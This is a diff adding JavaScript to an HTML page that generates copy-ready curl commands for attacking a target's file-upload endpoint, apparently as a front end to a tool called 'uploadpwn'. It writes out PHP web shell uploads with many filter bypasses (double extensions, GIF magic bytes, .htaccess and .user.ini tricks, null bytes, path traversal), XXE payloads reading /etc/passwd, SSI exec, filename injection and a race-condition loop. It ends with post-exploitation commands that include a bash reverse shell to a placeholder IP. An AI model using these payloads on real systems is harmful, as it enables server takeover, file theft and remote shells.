+    cookieFlag = ` -b "${getVal('cookieValue')}"`;
+  }
+  let headerFlag = '';
+  if (getVal('authMethod') === 'header' && getVal('headerValue')) {
+    headerFlag = ` -H "${getVal('headerValue')}"`;
+  }
+  const auth = cookieFlag + headerFlag;
+  const proxyFlag = getVal('proxy') ? ` -x ${getVal('proxy')}` : '';
+  const extra = auth + proxyFlag;
+
+  let html = '';
+
+  html += `<h3 style="color:var(--green)">1. Test if .php is accepted</h3>`;
+  html += cmdBlock(`curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@shell.php;type=image/jpeg'`, 'bash');
+
+  html += `<h3 style="color:var(--green)">2. Content-Type spoofing</h3>`;
+  html += cmdBlock(`curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@shell.php;type=image/jpeg'
+# Also try: image/gif, image/png, application/octet-stream`, 'bash');
+
+  html += `<h3 style="color:var(--green)">3. Double extension</h3>`;
+  html += cmdBlock(`curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@shell.php;filename=shell.php.jpg;type=image/jpeg'
+
+curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@shell.php;filename=shell.jpg.php;type=image/jpeg'`, 'bash');
+
+  html += `<h3 style="color:var(--green)">4. Alternative PHP extensions</h3>`;
+  html += cmdBlock(`for ext in phtml pht php5 phar pgif inc; do
+  echo "[*] Testing .$ext"
+  curl -s -X POST '${url}'${extra} \\
+    -F '${field}=@shell.php;filename=shell.'$ext';type=image/jpeg'
+done`, 'bash');
+
+  html += `<h3 style="color:var(--green)">5. GIF magic bytes bypass</h3>`;
+  html += cmdBlock(`# Create the payload
+printf 'GIF89a;\\n<?php system($_GET["cmd"]); ?>' > /tmp/shell.gif.php
+
+# Upload it
+curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@/tmp/shell.gif.php;filename=shell.gif.php;type=image/gif'
+
+# Try accessing it
+curl '${target}/uploads/shell.gif.php?cmd=id'`, 'bash');
+
+  html += `<h3 style="color:var(--green)">6. Null byte injection</h3>`;
+  html += cmdBlock(`curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@shell.php;filename=shell.php%00.jpg;type=image/jpeg'
+
+# Double URL-encoded null
+curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@shell.php;filename=shell.php%2500.jpg;type=image/jpeg'`, 'bash');
+
+  html += `<h3 style="color:var(--green)">7. Upload .htaccess (Apache only)</h3>`;
+  html += cmdBlock(`# Step 1: Upload .htaccess
+printf 'AddType application/x-httpd-php .jpg .png .gif' > /tmp/.htaccess
+curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@/tmp/.htaccess;filename=.htaccess;type=text/plain'
+
+# Step 2: Upload shell as .jpg
+printf 'GIF89a;\\n<?php system($_GET["cmd"]); ?>' > /tmp/shell.jpg
+curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@/tmp/shell.jpg;type=image/jpeg'
+
+# Step 3: Execute
+curl '${target}/uploads/shell.jpg?cmd=id'`, 'bash');
+
+  html += `<h3 style="color:var(--green)">8. SVG XXE file read</h3>`;
+  html += cmdBlock(`cat <<'EOF' > /tmp/xxe.svg
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">&xxe;</text></svg>
+EOF
+
+curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@/tmp/xxe.svg;type=image/svg+xml'
+
+# Access uploaded SVG to trigger XXE
+curl '${target}/uploads/xxe.svg'`, 'bash');
+
+  html += `<h3 style="color:var(--green)">9. Filename injection</h3>`;
+  html += cmdBlock('# OS Command injection in filename\n' +
+    "curl -s -X POST '" + url + "'" + extra + ' \\\n' +
+    "  -F '" + field + "=@shell.jpg;filename=file$(whoami).jpg;type=image/jpeg'\n\n" +
+    '# XSS in filename\n' +
+    "curl -s -X POST '" + url + "'" + extra + ' \\\n' +
+    "  -F '" + field + '=@shell.jpg;filename=<scr"+"ipt>alert(1)</scr"+"ipt>.jpg;type=image/jpeg\'\n\n' +
+    '# SQLi in filename\n' +
+    "curl -s -X POST '" + url + "'" + extra + ' \\\n' +
+    '  -F "' + field + "=@shell.jpg;filename=file' OR '1'='1.jpg;type=image/jpeg\"", 'bash');
+
+  html += `<h3 style="color:var(--green)">10. DOCX XXE</h3>`;
+  html += cmdBlock(`# Use uploadpwn to generate and test DOCX XXE
+python3 uploadpwn.py -t ${target}${ep !== '/upload.php' ? ' -e '+ep : ''} --docx-xxe /etc/passwd
+
+# Or XLSX XXE
+python3 uploadpwn.py -t ${target}${ep !== '/upload.php' ? ' -e '+ep : ''} --xlsx-xxe /etc/passwd`, 'bash');
+
+  html += `<h3 style="color:var(--green)">11. .user.ini + shell (Nginx)</h3>`;
+  html += cmdBlock(`# Step 1: Upload .user.ini
+printf 'auto_prepend_file=shell.gif' > /tmp/.user.ini
+curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@/tmp/.user.ini;filename=.user.ini;type=text/plain'
+
+# Step 2: Upload shell as .gif with GIF magic
+printf 'GIF89a;\\n<?php system($_GET["cmd"]); ?>' > /tmp/shell.gif
+curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@/tmp/shell.gif;type=image/gif'
+
+# Step 3: Access any .php in upload dir (prepends shell.gif)
+curl '${target}/uploads/index.php?cmd=id'`, 'bash');
+
+  html += `<h3 style="color:var(--green)">12. SSI injection (.shtml)</h3>`;
+  html += cmdBlock(`cat <<'EOF' > /tmp/ssi.shtml
+<!--#exec cmd="id" -->
+<!--#exec cmd="cat /etc/passwd" -->
+EOF
+curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@/tmp/ssi.shtml;filename=shell.shtml;type=text/html'
+
+# Access the uploaded .shtml
+curl '${target}/uploads/shell.shtml'`, 'bash');
+
+  html += `<h3 style="color:var(--green)">13. Path traversal in filename</h3>`;
+  html += cmdBlock(`# Basic path traversal
+curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@shell.php;filename=../../../var/www/html/shell.php;type=image/jpeg'
+
+# Double-encoded
+curl -s -X POST '${url}'${extra} \\
+  -F '${field}=@shell.php;filename=..%252f..%252fshell.php;type=image/jpeg'`, 'bash');
+
+  html += `<h3 style="color:var(--green)">14. HTTP PUT bypass</h3>`;
+  html += cmdBlock(`# Direct PUT to upload path
+curl -s -X PUT '${target}/uploads/shell.php'${extra} \\
+  -H 'Content-Type: application/x-php' \\
+  -d '<?php system($_GET["cmd"]); ?>'
+
+# Try MOVE method
+curl -s -X MOVE '${target}/uploads/shell.jpg'${extra} \\
+  -H 'Destination: ${target}/uploads/shell.php'`, 'bash');
+
+  html += `<h3 style="color:var(--green)">15. Double Content-Disposition</h3>`;
+  html += cmdBlock(`# Manual multipart with two C-D headers
+printf -- '--BOUNDARY\\r\\nContent-Disposition: form-data; name="${field}"; filename="safe.jpg"\\r\\nContent-Disposition: form-data; name="${field}"; filename="shell.php"\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n<?php system($_GET["cmd"]); ?>\\r\\n--BOUNDARY--' \\
+  | curl -s -X POST '${url}'${extra} \\
+    -H 'Content-Type: multipart/form-data; boundary=BOUNDARY' \\
+    --data-binary @-`, 'bash');
+
+  html += `<h3 style="color:var(--green)">16. Race condition</h3>`;
+  html += cmdBlock(`# Terminal 1: upload loop
+while true; do
+  curl -s -X POST '${url}'${extra} \\
+    -F '${field}=@shell.php;type=image/jpeg'
+done
+
+# Terminal 2: access loop (run simultaneously)
+while true; do
+  curl -s '${target}/uploads/shell.php?cmd=id' | grep -q "uid=" && echo "GOT SHELL!" && break
+done`, 'bash');
+
+  html += `<h3 style="color:var(--green)">17. Access the shell after upload</h3>`;
+  html += cmdBlock(`# Try common upload directories
+for dir in uploads upload files images media profile_images avatars; do
+  echo "[*] Trying /$dir/shell.php"
+  curl -s '${target}/'$dir'/shell.php?cmd=id'${extra}
+done`, 'bash');
+
+  html += `<h3 style="color:var(--green)">18. Post-exploitation</h3>`;
+  html += cmdBlock(`# Assuming shell is at ${target}/uploads/shell.php
+
+# Quick recon
+curl '${target}/uploads/shell.php?cmd=id;whoami;uname+-a'${extra}
+
+# Read flag
+curl '${target}/uploads/shell.php?cmd=cat+/flag.txt'${extra}
+
+# Find flags
+curl '${target}/uploads/shell.php?cmd=find+/+-name+flag*+-type+f+2>/dev/null'${extra}
+
+# Reverse shell (start nc -lvnp 4444 first)
+curl '${target}/uploads/shell.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261"'${extra}`, 'bash');
+
+  document.getElementById('curlOutput').innerHTML = html;
+  bindCopyButtons();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  CHEATSHEET TABS
+// ═══════════════════════════════════════════════════════════════════════════
+function cheatTab(el, id) {
+  el.parentElement.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+  el.closest('.panel').querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  HELPERS
+// ═══════════════════════════════════════════════════════════════════════════
+let cmdCounter = 0;
+function cmdBlock(code, lang, id) {
+  const cid = id || ('cmd-' + (cmdCounter++));
+  return `<div class="cmd-block" id="${cid}">
+<span class="lang">${lang || ''}</span>
+<button class="copy-btn" onclick="copyBlock('${cid}')">Copy</button>
+${escapeHtml(code)}</div>`;
+}
+
+function escapeHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function copyBlock(id) {
+  const block = document.getElementById(id);
+  const text = block.innerText.replace(/^(bash|curl|Copy)\s*/gm, '').trim();
+  navigator.clipboard.writeText(text).then(() => {
+    const btn = block.querySelector('.copy-btn');
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+function copyText(text) {
+  navigator.clipboard.writeText(text).then(() => {});
+}
+
+function bindCopyButtons() {
+  // Already bound via onclick
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  INIT
+// ═══════════════════════════════════════════════════════════════════════════
+buildCustomSelects();
+toggleAuthFields();
+toggleModuleExtras();
+updateReconCurl();
+</script>
+</body>
+</html>
